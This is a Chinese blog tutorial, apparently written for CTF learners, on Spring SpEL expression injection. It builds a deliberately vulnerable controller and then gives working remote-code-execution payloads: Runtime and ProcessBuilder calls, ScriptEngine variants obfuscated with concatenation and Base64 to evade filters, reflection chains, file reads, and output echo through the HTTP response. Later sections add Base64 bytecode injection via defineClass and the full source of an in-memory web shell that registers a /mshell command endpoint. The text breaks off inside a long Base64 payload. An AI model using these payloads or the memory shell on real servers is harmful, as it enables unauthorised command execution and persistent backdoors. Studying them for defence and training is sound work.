---
layout: post
title: 'Java入门之SpEL表达式注入入门学习'
date: "2025-12-12T00:44:44Z"
---
Java入门之SpEL表达式注入入门学习
====================

SpEL简介
======

SpEL是`Spring 框架特有`的表达式语言。如果输入的字符串被 `expression.getValue()` 执行了，就能 RCE。**SpEL (Spring Expression Language)** 注入是 Java Web 题最常见的考点之一，因为它逻辑清晰，利用方式很像 PHP 的 `eval`。

确认Spring Boot框架
===============

一、看pom.xml
----------

打开项目根目录的pom.xml，如果看到标签里面写着spring-boot-starter-parent，或者里面有一堆spring-boot-starter-web之类的包，基本能确定是Spring Boot框架。

二、看入口类
------

找到`src/main/java`下带有main函数的文件。类头一定带有@SpringBootApplication注解，main方法里只有一行：

    SpringApplication.run(类名.class, args);
    

三、终端输出
------

如果把题目源码在本地运行，可以看到控制台输出巨大的ASCII字符画Spring。

前置知识
====

首先我们要明确java中的类、对象、方法

一、类（图纸）
-------

在代码中看到java.lang.Runtime这种长长的名字，它就是类（图纸）。图纸本身不能干活，它只是规定了东西长什么样。类可以主要分为几个大类：

### 1.普通类

这种类的代码里写好的所有的功能，可以直接干活。特点：可以直接new，所有的方法都有具体的代码实现。

### 2.静态工具类

这种类的构造方法通常是私有的，因此不能直接new，而里面的方法全部都是静态方法static，可以直接通过类名.方法名()调用。

### 3.抽象类

这种类只规定了大体方向，具体细节不全，因此也不能new。它存在的意义就是为了让别人继承它，由子类去补全代码。

### 4.接口

Java8之前，这种类里面全部都是空方法，只定义”要干什么“，不定义”怎么干“。

类不是”继承“接口，而是”签署（实现）“接口（implements）。

二、对象（实物）
--------

我们需要用图纸造出一个真实的物体。在Java里，根据图纸造东西就是类的实例化过程，比如new Scanner(…)就是“造一个新的扫描器”。

三、方法（动作）
--------

大部分情况下，我们最终需要调用的就是方法。普通方法需要从对象中调用，而静态方法可以直接从类中调用，这种类需要用T()来进行包裹。

就拿getRuntime()方法为例，从源码中可以看到这个方法是一种静态方法static，所以要从它的类java.lang.Runtime中调用，这个类要用T()包裹，所以调用方式是

    T(java.lang.Runtime).getRuntime()
    

这里注意，`这个用T包裹的语法属于SpEL语法，不是Java原生语法`。

在原生Java中，我们只需要写java.lang.Runtime.getRuntime()即可。

因为在Java编译器中，它是上帝视角，在编译期就读了所有的JDK库。但是在SpEL解析器中，如果我们想表达这是一个Java类，就必须用T括起来。（T代表Type，类）。

对比php反序列化也是一样的道理，在某些类中会有一些魔术方法或者自定义的方法，满足某些条件时会触发特定的魔术方法，这些魔术方法的触发可能又会调用其他的方法，这也就是pop链的原理。

方法调用结束后，会返回特定类型的对象，比如getRuntime返回Runtime类型的对象，exec返回Process类型的对象。

模拟漏洞环境
======

我们起一个web服务来模拟spel注入。一下两个文件都放在com.ctf.web包中。

CTFApplication.java

    package com.ctf.web;
    
    import org.springframework.boot.SpringApplication;
    import org.springframework.boot.autoconfigure.SpringBootApplication;
    
    // 这个注解告诉 Java：这是一个 Spring Boot Web 应用
    @SpringBootApplication
    public class CTFApplication {
        public static void main(String[] args) {
            // 一行代码启动整个 Web 服务 (自带 Tomcat)
            SpringApplication.run(CTFApplication.class, args);
        }
    }
    

HelloController.java

    package com.ctf.web;
    
    // 1. Web 相关的包 (负责路由和参数)
    import org.springframework.web.bind.annotation.GetMapping;
    import org.springframework.web.bind.annotation.RequestParam;
    import org.springframework.web.bind.annotation.RestController;
    
    // 2. SpEL 相关的包 (负责漏洞演示)
    import org.springframework.expression.Expression;
    import org.springframework.expression.ExpressionParser;
    import org.springframework.expression.spel.standard.SpelExpressionParser;
    
    @RestController
    public class HelloController {
    
        /**
         * SpEL 注入漏洞靶场
         * 访问方式：/spel?cmd=1+1
         */
        @GetMapping("/spel")
        public String spelVuln(@RequestParam String cmd) {
            // 1. 创建解析器 (相当于准备 PHP 的 eval 环境)
            ExpressionParser parser = new SpelExpressionParser();
    
            try {
                // 2. 解析用户输入的字符串 (cmd)
                // 这一步只是把字符串变成一个“表达式对象”，还没执行
                Expression exp = parser.parseExpression(cmd);
    
                // 3. 执行表达式并获取结果 (Sink 点)
                // 这一步才会真正执行代码！
                Object value = exp.getValue();
    
                // 防止结果为空导致报错
                if (value == null) {
                    return "执行成功，但没有返回值";
                }
    
                return "SpEL 执行结果: " + value.toString();
    
            } catch (Exception e) {
                e.printStackTrace(); // 在控制台打印详细错误，方便调试
                return "执行出错: " + e.getMessage();
            }
        }
    }
    

/spel?cmd=10\*10即可执行语句。

找到漏洞点
=====

SpEL注入的原理很简单：用户输入的字符串被当成了代码去执行。

在php中，我们要找的是`eval($input)`；而在java中，我们要找的是下面这三行代码的组合（这也是代码审计的重点）：

### 1.解析器创建

    ExpressionParser parser = new SpelExpressionParser();
    

2.解析表达式
-------

    Expression exp = parser.parseExpression(用户输入);
    

3.执行表达式
-------

    exp.getValue(); //这里是执行点
    

只要看到 **`SpelExpressionParser`** 和 **`parseExpression`** 且参数可控，直接判定为 RCE（远程代码执行）。

分析漏洞点原理
=======

主要的就是这三行代码

    // 创建解析器
    ExpressionParser parser = new SpelExpressionParser();
    
    // 解析字符串
    Expression exp = parser.parseExpression(cmd);
    
    // 漏洞爆发点
    Object value = exp.getValue();
    

初始化引擎
-----

    ExpressionParser parser = new SpelExpressionParser();
    

首先我们要明确，Java本身是听不懂SpEL语法的，Java只懂Java语法。为了让Java能够看懂SpEL语法，需要先创建一个解析器，SpelExpressionParser就是这个解析器。如果没有这个解析器，我们就没办法处理后面的字符串。

编译/解析
-----

    Expression exp = parser.parseExpression(cmd);
    

它把死的字符串变成了活的对象。

比如我们传入?cmd=1+1，对于计算机来说，这只是普通的文本。而解析器parser拿到这个文本后，调用parseExpression方法开始语法分析，检查是否符合SpEL语法。如果检查无误，则会生成一个Expression对象。此时代码没有被执行。

代码执行 | 核心机制：AST（抽象语法树）
----------------------

当我们调用 `parser.parseExpression(...)` 时，Spring 并没有立即执行代码，而是把我们输入的字符串拆解成了一棵 **AST（抽象语法树）**。

它被拆成了三个节点：

1.  **节点 A (TypeReference):** `T(java.lang.Runtime)` —— 负责找类。
2.  **节点 B (MethodReference):** `.getRuntime()` —— 负责调静态方法。
3.  **节点 C (MethodReference):** `.exec("calc")` —— 负责调普通方法。

**`getValue()` 的工作原理：** 当你调用 `getValue()` 时，它会**触发**这棵树的遍历。它命令节点 A 开始跑，节点 A 跑完把棒子（结果）传给节点 B，B 传给 C。**只有跑完全程，才能算出最终的 Value。**

底层引擎：Java反射的封装
--------------

之所以节点可以调用方法，是因为getValue()内部封装了极其强大的Java反射API。这里我们后面再详细学习Java反射。

模板注入SpEL
========

SpEL表达式注入主要分为两种，前面我们所说的是直接注入，下面我们学习模板注入。

### 漏洞特征

在源码中看到开启了模板模式

    // 定义模板上下文：识别 #{...}
    ParserContext context = new TemplateParserContext();
    // 解析
    Expression exp = parser.parseExpression(userInput, context);
    

这个时候，普通的字符串会被当成文本，只有被`#{ ... }`包裹的内容才会被当成代码执行。

    #{ T(java.lang.Runtime).getRuntime().exec('calc') }
    

常见SpEL注入方式
==========

Runtime
-------

    T(java.lang.Runtime).getRuntime().exec('calc')
        
    // 回显
    new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).next()
    

想要执行命令，我们就要找到exec方法，这个方法存在系统管理员getRuntime方法中。只要我们找到getRuntime这个方法就可以调用exec方法。而getRuntime方法是一个静态方法，可以直接从Runtime类调用，根据前面提到的，我们需要把这个类包裹在T中，也就是T(java.lang.Runtime).getRuntime()。后面再街上exec就可以执行命令了。这也就是我们的第一条payload。

这种方法有一个弊端，那就是没有回显。所以我们需要想办法让执行结果回显到网页中。这里就需要用到Scanner, getInputStream和next。

getInputStream()返回的是java.io.InputStream对象，它里面只是二进制数据，如果直接把对象返回给网页，那么网页上只会显示这个对象的编号。而我们需要的是字符串，所以需要把二进制数据转为字符串。

java.util.Scanner就可以达成我们的目的。它可以把二进制字节流转为字符串。

Scanner它是一个普通类。由于next()不是静态方法，所以需要把Scanner类实例化为对象再调用next方法。

那么为什么要把T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()这么一长串包裹在Scanner的括号中呢？

我们可以看源码中Scanner类的定义

    // JDK 源码定义
    public class Scanner {
        // 构造函数：接收一个 InputStream 类型的参数
        public Scanner(InputStream source) {
            // ... 初始化代码 ...
        }
    }
    

java期望收到一个InputStream类型的参数，而T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()最终返回的对象类型属于java.io.InputStream，把这一长串放在括号中，本质上就是把表达式的计算结果作为参数传递。

ProcessBuilder
--------------

如果Runtime关键字被ban了，这时我们要用ProcessBuilder。

    new java.lang.ProcessBuilder("calc").start()
    new java.util.Scanner(new java.lang.ProcessBuilder("whoami").start().getInputStream()).next()
    

ScriptEngine
------------

这是Java8环境下的神器，它允许我们在Java中直接写JavaScript代码。

它可以绕过对Java类名的过滤，而且JS写逻辑更方便。

由于eval的参数是一个字符串，所以我们可以对eval的参数进行拼接、编码、变形

正常payload

    // 1. 获取 JS 引擎
    // 2. 执行 JS 代码：在 JS 里调用 Java
    // 这里利用的是SpEL原生流
    new javax.script.ScriptEngineManager().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('calc')")
        
    // 或者利用Java反射流
    T(javax.script.ScriptEngineManager).newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('calc')")
    

### 拼接

    // SpEL 会先执行括号里的字符串拼接，拼好后再传给 eval
    new javax.script.ScriptEngineManager().getEngineByName("js").eval("java.lang.Run" + "time" + ".getRuntime().exec('calc')")
        
    new javax.script.ScriptEngineManager().getEngineByName("js").eval('java.lang.Run'.concat('time').concat('.getRuntime().exec("calc")'))
    

### 编码

    // 把 "Runtime" 换成 "Run" + char(116) + "ime" (116 是 't' 的 ASCII 码)
    new javax.script.ScriptEngineManager().getEngineByName("js").eval("java.lang.Run" + T(java.lang.Character).toString(116) + "ime.getRuntime().exec('calc')")
    // base64编码
    new javax.script.ScriptEngineManager()
       .getEngineByName("js")
       .eval(new java.lang.String(T(java.util.Base64).getDecoder().decode("dmFyIHMgPSBbM107IHNbMF09J2NtZCc7IHNbMV09Jy9jJzsgc1syXT0nY2FsYyc7IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKHMpOw==")))
    

文件读取
----

服务器不出网或者某些命令被禁了，只想读flag，可以使用`java.nio.file.Files`

    // 1. 读取所有字节
    // 2. 转成 String 显示
    new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('E:/1_msg1.txt')))
    

Java反射构造RCE
-----------

这里建议大家先学两天Java反射，再回来看会更加透彻。

我们首先看目标代码，转成Java反射代码，再转成SpEL代码。

### 目标代码

    Runtime.getRuntime().exec("calc");
    

### Java反射代码

    Class clazz = Class.forName("java.lang.Runtime");
    
    Method m = clazz.getMethod("getRuntime");
    
    Object o = m.invoke(null);
    
    clazz.getMethod("exec".String.class).invoke(o, "calc.exe");
    

### SpEL代码

    // 对应步骤 1: 获取类
    T(java.lang.Class).forName('java.lang.Runtime')
    
    // 对应步骤 2: 获取方法
    .getMethod('getRuntime')
    
    // 对应步骤 3: 执行静态方法拿到对象
    .invoke(null)
    
    // 对应步骤 4: 拿到对象后直接执行 exec
    .exec('calc')
    

引号中的内容动态可控，我们可以通过拼接、编码等，绕过可能的过滤。

    // 步骤 1: 拿到类 (隐藏了 Runtime)
    T(java.lang.Class).forName('java.lang.Run' + 'time')
    
    // 步骤 2: 拿到 getRuntime 方法
    .getMethod('getRun'+'time')
    
    // 步骤 3: 拿到 Runtime 对象
    .invoke(null)
    
    // 步骤 4: 【这里暴露了！】直接调用 exec
    .exec('calc')
    

回显方式
====

Scanner
-------

在上面的payload中我们提到了一种能够在网页上面回显内容的方式，通过Scanner扫描器

    new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).next()
    

通过Scanner我们把命令执行结果转换成了一个String字符串，SpEL引擎把这个字符串返回给了我们的Java代码。但是注意，这里我们的源码中是这样写的

        public String spelVuln(@RequestParam String cmd) {
    			// ...
                return "SpEL 执行结果: " + value.toString();
            	// ...
        }
    

这个方法返回的值是String类型，所以通过Scanner转为字符串后，可以将执行结果结果返回到网页上。

而如果开发者写的代码是

    public void vuln() { ... } // 没有返回值
    

或者它的return是这样写的

    return "执行成功"; // 没有返回执行结果
    

那么这样的后果就是，虽然我们通过Scanner拿到了字符串，但是并没有途径把执行结果显示在网页上（源码中的限制）。

StreamUtils + RequestContextHolder
----------------------------------

这种方法可以直接将执行结果写入http响应中。

    // windows版本
    T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec('cmd /c whoami').getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())
        
    // Linux版本
    T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec('/bin/sh -c id').getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())
    

我们可以将这个payload分成三部分来看。

### 第一部分：命令结果

    T(java.lang.Runtime).getRuntime().exec('...').getInputStream()
    

这一部分通过Runtime调用exec执行系统命令，获取执行结果，再调用getInputStream获取一个数据流。此时执行结果就在这个流中，等待被读取。

### 第二部分：响应通道

    T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()
    

这里是将执行结果写入http响应中的最关键的一步。

*   **`RequestContextHolder`**：这是 Spring 提供的“全局大管家”，它持有当前正在处理的所有 HTTP 请求信息。
*   **`currentRequestAttributes()`**：拿到当前请求的上下文。
*   **`getResponse()`**：**直接抢到了 HTTP 响应对象 (HttpServletResponse)**。
*   **`getOutputStream()`**：打开了向浏览器发送数据的 **输出流 (OutputStream)**。
*   **状态：** 这就像是你直接在这个网页的背后插了一根管子，准备往里灌水。

这里换一种写法也可以用于探测漏洞是否存在（别忘了T是SpEL专属语法）

    T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader("Al1ex","success")
    

### 第三部分：数据传输

    T(org.springframework.util.StreamUtils).copy(第一部分, 第二部分)
    

StreamUtils是Spring框架自带的一个工具类，专门处理流。copy(in, out)的作用是把输入流里的所有字节，原封不动的复制到输出流里。这样一来，exec命令的执行结果就通过http响应发送到了网页上。

字节码注入
-----

[https://xz.aliyun.com/news/16342](https://xz.aliyun.com/news/16342)

它的核心逻辑是：**我不直接在 SpEL 表达式里写命令（如 `Runtime.exec`），而是把一个包含恶意代码的 Java `.class` 文件（编译后的字节码），通过 Base64 编码塞进 Payload 里，然后让服务器把这段字节码还原成一个类并加载运行。**

### 1.编写恶意Java类（exp.java）

    public class exp {
        // static 静态代码块：这是核心！
        static {
            try {
                // 只要这个类被“加载”进内存，这段代码就会自动执行
                Runtime.getRuntime().exec("cmd.exe /c calc.exe");
            } catch (Exception e) { e.printStackTrace(); }
        }
        // main 方法在这里没用，因为我们不会去调用它
        public static void main(String[] args) { }
    }
    

**关键点：** `static {}` 静态代码块。

**原理：** 在 Java 中，当一个类被 ClassLoader（类加载器）**初始化/加载**时，静态代码块里的代码会被立即自动执行。攻击者利用这个特性，确保只要把类加载进去，命令就执行了，不需要额外调用方法。

### 2.编译打包

**编译：** 攻击者把 `exp.java` 编译成 `exp.class`（这是二进制文件，计算机能读懂，人看不懂）。

    javac exp.java
    

**Base64 编码：** 也就是你代码里的 `encode.java` 做的事情。

*   因为 HTTP Header 只能传输文本，不能传输二进制乱码。
*   所以必须把 `exp.class` 的二进制内容转换成一长串 **Base64 字符串** (`yv66vgAA...`)。

encode.java

    import java.io.ByteArrayOutputStream;
    import java.io.FileInputStream;
    import java.util.Base64;
    import java.util.Base64.Encoder;
    /*
     * 加密class文件
     */
    public class encode {
        public static void main(String args[]) {
            byte[] buffer = null;
            String filepath = "C:\\Users\\Al1ex\\Desktop\\java-object-searcher-master\\exp.class";
            try {
                FileInputStream fis = new FileInputStream(filepath);
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                byte[] b = new byte[1024];
                int n;
                while((n = fis.read(b))!=-1) {
                    bos.write(b,0,n);
                }
                fis.close();
                bos.close();
                buffer = bos.toByteArray();
            }catch(Exception e) {
                e.printStackTrace();
            }
            Encoder encoder = Base64.getEncoder();
            String value = encoder.encodeToString(buffer);
            System.out.println(value);
        }
    }
    

### 3.执行

最后我们利用SpEL注入点执行，构造表达式

    T(org.springframework.cglib.core.ReflectUtils).defineClass(
        'exp', 
        T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('yv66vgAAADQAIgoACAATCgAUABUIABYKABQAFwcAGAoABQAZBwAaBwAbAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlAQAKU291cmNlRmlsZQEACGV4cC5qYXZhDAAJAAoHABwMAB0AHgEAE2NtZC5leGUgL2MgY2FsYy5leGUMAB8AIAEAE2phdmEvbGFuZy9FeGNlcHRpb24MACEACgEAA2V4cAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAADAAEACQAKAAEACwAAAB0AAQABAAAABSq3AAGxAAAAAQAMAAAABgABAAAAAQAJAA0ADgABAAsAAAAZAAAAAQAAAAGxAAAAAQAMAAAABgABAAAABwAIAA8ACgABAAsAAABHAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAAA4AAwAAAAQACQAFABEABgAQAAAABwACTAcABQQAAQARAAAAAgAS'), 
        T(org.springframework.util.ClassUtils).getDefaultClassLoader()
    )
    

注意执行的时候必须全部URL编码，否则报错

    T%28org%2Espringframework%2Ecglib%2Ecore%2EReflectUtils%29%2EdefineClass%28%0A%20%20%20%20%27exp%27%2C%20%0A%20%20%20%20T%28com%2Esun%2Eorg%2Eapache%2Exml%2Einternal%2Esecurity%2Eutils%2EBase64%29%2Edecode%28%27yv66vgAAADQAIgoACAATCgAUABUIABYKABQAFwcAGAoABQAZBwAaBwAbAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlAQAKU291cmNlRmlsZQEACGV4cC5qYXZhDAAJAAoHABwMAB0AHgEAE2NtZC5leGUgL2MgY2FsYy5leGUMAB8AIAEAE2phdmEvbGFuZy9FeGNlcHRpb24MACEACgEAA2V4cAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAADAAEACQAKAAEACwAAAB0AAQABAAAABSq3AAGxAAAAAQAMAAAABgABAAAAAQAJAA0ADgABAAsAAAAZAAAAAQAAAAGxAAAAAQAMAAAABgABAAAABwAIAA8ACgABAAsAAABHAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAAA4AAwAAAAQACQAFABEABgAQAAAABwACTAcABQQAAQARAAAAAgAS%27%29%2C%20%0A%20%20%20%20T%28org%2Espringframework%2Eutil%2EClassUtils%29%2EgetDefaultClassLoader%28%29%0A%29
    

payload分析

**1.解码 (Decode)：** `T(com.sun...Base64).decode('yv66...')`

*   SpEL 调用 JDK 内部的 Base64 工具，把那一长串字符串，**还原**成了 `al1ex.class` 的原始二进制字节流（byte array）。

**2.定义类 (Define Class)：** `T(org.springframework.cglib.core.ReflectUtils).defineClass(...)`

*   `ReflectUtils` 是 Spring 自带的一个工具类（CGLIB 库）。
*   `defineClass` 方法的作用是：**给它一堆字节，它能在内存里把这堆字节变成一个活生生的 Java 类对象。**

**3.触发炸弹：**

*   当 `defineClass` 执行成功时，`al1ex` 类就被加载到了服务器的 JVM 内存中。
    
*   **BOOM!** 因为类被加载了，那个 `static { ... }` 代码块瞬间被触发。
    
*   `calc.exe` 弹出。
    

内存马
===

刚才字节码注入是将恶意代码写入内存，这种手法与内存马非常相像，我们可以仿照这种模式来写内存马。

编写MemShell.java
---------------

注意开头一定不要带package，然后注意里面的MemShell名字，如果要改的话一定要Java文件名和里面的所有全部都要改。

    import org.springframework.web.context.WebApplicationContext;
    import org.springframework.web.context.request.RequestContextHolder;
    import org.springframework.web.context.request.ServletRequestAttributes;
    import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
    import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
    
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.InputStream;
    import java.lang.reflect.Method;
    import java.util.Scanner;
    
    // 改名为 MemShell
    public class MemShell {
    
        static {
            try {
                // 1. 获取上下文
                ServletRequestAttributes attributes = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();
                WebApplicationContext context = (WebApplicationContext) attributes.getAttribute(
                        "org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
    
                // 2. 获取 RequestMappingHandlerMapping
                RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);
    
                // 3. 获取 RequestMappingInfo 构建器
                Method pathsMethod = RequestMappingInfo.class.getMethod("paths", String[].class);
                pathsMethod.setAccessible(true); // 暴力权限 1
                Object pathsBuilder = pathsMethod.invoke(null, (Object) new String[]{"/mshell"});
    
                // 4. 【核心修复】获取并应用服务器配置
                try {
                    Method getBuilderConfigMethod = RequestMappingHandlerMapping.class.getMethod("getBuilderConfiguration");
                    getBuilderConfigMethod.setAccessible(true); // 暴力权限 2
                    Object config = getBuilderConfigMethod.invoke(mapping);
    
                    if (config != null) {
                        Method optionsMethod = pathsBuilder.getClass().getMethod("options", RequestMappingInfo.BuilderConfiguration.class);
                        optionsMethod.setAccessible(true); // <--- ⭐ 之前报错就是缺这行！暴力权限 3
                        optionsMethod.invoke(pathsBuilder, config);
                    }
                } catch (Exception e) {
                    // 忽略旧版本不支持的情况
                }
    
                // 5. 构建 RequestMappingInfo
                Method buildMethod = pathsBuilder.getClass().getMethod("build");
                buildMethod.setAccessible(true); // 暴力权限 4
                RequestMappingInfo info = (RequestMappingInfo) buildMethod.invoke(pathsBuilder);
    
                // 6. 实例化与注册
                MemShell instance = new MemShell();
                Method method = MemShell.class.getMethod("cmd", HttpServletRequest.class, HttpServletResponse.class);
                method.setAccessible(true); // 暴力权限 5
                mapping.registerMapping(info, instance, method);
    
            } catch (Exception e) {
                e.printStackTrace(); // 如果还报错，请看控制台
            }
        }
    
        public void cmd(HttpServletRequest request, HttpServletResponse response) {
            try {
                String cmd = request.getParameter("cmd");
                if (cmd != null && !cmd.isEmpty()) {
                    boolean isWin = System.getProperty("os.name").toLowerCase().contains("win");
                    String[] cmds = isWin ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                    Process process = Runtime.getRuntime().exec(cmds);
                    InputStream in = process.getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String output = s.hasNext() ? s.next() : "";
                    response.getWriter().write(output);
                    response.getWriter().flush();
                } else {
                    response.getWriter().write("MemShell (Final) is active!");
                }
            } catch (Exception e) {
                try { e.printStackTrace(response.getWriter()); } catch (Exception ex) {}
            }
        }
    }
    

编译
--

我们在IDEA上方的构建中，选择重新构建项目。由于没有package包，所以编译后的class文件要去根目录中的target中去找。

编码
--

把生成的编译后的class文件base64编码，去掉所有换行符。编码后，cyberchef执行给所有符号url编码。

附编码脚本

    package com.ctf.web;
    
    import java.io.ByteArrayOutputStream;
    import java.io.FileInputStream;
    import java.io.FileWriter;
    import java.io.IOException;
    import java.util.Base64;
    import java.util.Base64.Encoder;
    
    /*
     * 加密class文件
     */
    public class base64EncodeClass {
        public static void main(String args[]) {
            byte[] buffer = null;
            String filepath = "MemShell6.class";
            try {
                FileInputStream fis = new FileInputStream(filepath);
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                byte[] b = new byte[1024];
                int n;
                while((n = fis.read(b))!=-1) {
                    bos.write(b,0,n);
                }
                fis.close();
                bos.close();
                buffer = bos.toByteArray();
            } catch(Exception e) {
                e.printStackTrace();
                return;
            }
    
            Encoder encoder = Base64.getEncoder();
            String value = encoder.encodeToString(buffer);
    
            // 删除所有换行符
            value = value.replaceAll("\\r\\n|\\r|\\n", "");
    
            // 输出到1.txt文件
            try (FileWriter writer = new FileWriter("1.txt")) {
                writer.write(value);
                System.out.println("Base64编码已保存到 1.txt 文件中");
            } catch (IOException e) {
                System.err.println("写入文件时出错: " + e.getMessage());
                e.printStackTrace();
            }
        }
    }
    

注入
--

把生成的base64编码后的、去掉换行符的、执行了url编码的payload替换进下面的payload执行。

    T(org.springframework.cglib.core.ReflectUtils).defineClass(
        'MemShell6', 
        T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('yv66vgAAADQA6QoALAB5CABBCwA2AHoKAAoAewgAfAoAfQB+CgAKAH8IAIAKAAoAgQcAgggAgwgAhAgAhQgAhgoAhwCICgCHAIkKAIoAiwcAjAoAEgCNCACOCgASAI8KABIAkAoAEgCRCACSCwA3AJMKAJQAlQoAlACWCACXBwCYCgAdAJkKAJoAmwcAnAgAnQoAIACeBwCfBwCgCwAjAKEHAKIIAKMHAKQHAEYKACgApQoApgCnBwCoCACpCgCmAKoIAKsKACwArAgArQcArggAsQcAsgoANAB5BwCzBwC0CgAkALUKAB0AtgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQALTE1lbVNoZWxsNjsBAANjbWQBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQAFaXNXaW4BAAFaAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAZvdXRwdXQBABJMamF2YS9sYW5nL1N0cmluZzsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEADVN0YWNrTWFwVGFibGUHAIIHALIHALMHALQHALcHALgHAIwHAJgBABBNZXRob2RQYXJhbWV0ZXJzAQAIPGNsaW5pdD4BAA1vcHRpb25zTWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABZnZXRCdWlsZGVyQ29uZmlnTWV0aG9kAQAGY29uZmlnAQASTGphdmEvbGFuZy9PYmplY3Q7AQAKYXR0cmlidXRlcwEAQkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzOwEAB2NvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAHbWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEAC3BhdGhzTWV0aG9kAQAMcGF0aHNCdWlsZGVyAQALYnVpbGRNZXRob2QBAARpbmZvAQA/TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAIaW5zdGFuY2UBAAZtZXRob2QHAJwHAJ8HAKAHALkHAKgBAApTb3VyY2VGaWxlAQAOTWVtU2hlbGw2LmphdmEMADoAOwwAugC7DAC8AL0BAAdvcy5uYW1lBwC+DAC/ALsMAMAAwQEAA3dpbgwAwgDDAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwEABy9iaW4vc2gBAAItYwcAxAwAxQDGDADHAMgHALcMAMkAygEAEWphdmEvdXRpbC9TY2FubmVyDAA6AMsBAAJcQQwAzADNDADOAL0MAM8AwQEAAAwA0ADRBwDSDADTANQMANUAOwEAHE1lbVNoZWxsNiAoRmluYWwpIGlzIGFjdGl2ZSEBABNqYXZhL2xhbmcvRXhjZXB0aW9uDADWANcHANgMANkA2gEAQG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQMANsA3AEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3Nwc